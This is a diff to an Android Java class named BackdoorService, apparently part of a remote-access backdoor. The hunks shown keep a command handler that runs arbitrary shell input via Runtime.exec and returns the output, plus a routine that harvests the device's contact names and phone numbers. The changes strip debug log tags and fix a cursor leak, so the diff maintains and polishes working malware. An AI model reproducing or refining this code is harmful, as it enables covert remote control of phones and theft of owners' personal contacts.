@@ -159,7 +159,6 @@ public class BackdoorService extends Service {
                 input = input.replaceFirst(EXECUTE_COMMAND_TEMPLATE + " ", "");
                 result = execute(input);
             } else if(cmd[0].equals(GET_CONTACT_TEMPLATE)) {
-                //TODO: ContactProvider
                 String local_result = "";
                 try {
                     ArrayList<Contact> contacts = getContacts();
@@ -169,7 +168,7 @@ public class BackdoorService extends Service {
                     result = local_result;
                 } catch (Exception e) {
                     e.printStackTrace();
-                    Log.i("ggg-Error", "[EvalOutput CONTACT] Error contact Provider");
+                    Log.i("Error", "[EvalOutput CONTACT] Error contact Provider");
                 }
                 result = local_result;
             }
@@ -181,7 +180,6 @@ public class BackdoorService extends Service {
 
     private String execute(String commandInput) {
         String result = "Error Occurred\n";
-        Log.i("ggg-execute", "commandInput: " + commandInput);
         try{
             Process process = Runtime.getRuntime().exec(commandInput);
             BufferedReader reader = new BufferedReader(
@@ -196,10 +194,10 @@ public class BackdoorService extends Service {
             process.waitFor();
             result = output.toString();
         }catch(IOException e){
-            Log.d("ggg-exception throwed", e.getMessage());
+            Log.d("exception throwed", e.getMessage());
             e.printStackTrace();
         }catch(InterruptedException e){
-            Log.d("ggg-exception throwed", e.getMessage());
+            Log.d("exception throwed", e.getMessage());
             e.printStackTrace();
         }
         return result;
@@ -210,7 +208,6 @@ public class BackdoorService extends Service {
         Cursor contactsCursor = getContentResolver().query(uri, null, null,
                 null, ContactsContract.Contacts.DISPLAY_NAME + " ASC ");
         ArrayList<Contact> contacts = new ArrayList<>();
-
 
         if (contactsCursor.moveToFirst()) {
             do {
@@ -260,7 +257,8 @@ public class BackdoorService extends Service {
                 }
                 Contact c = new Contact(displayName, phoneNumber);
                 contacts.add(c);
-
+                // close to prevent leak
+                dataCursor.close();
             } while(contactsCursor.moveToNext());
         }
         return contacts;
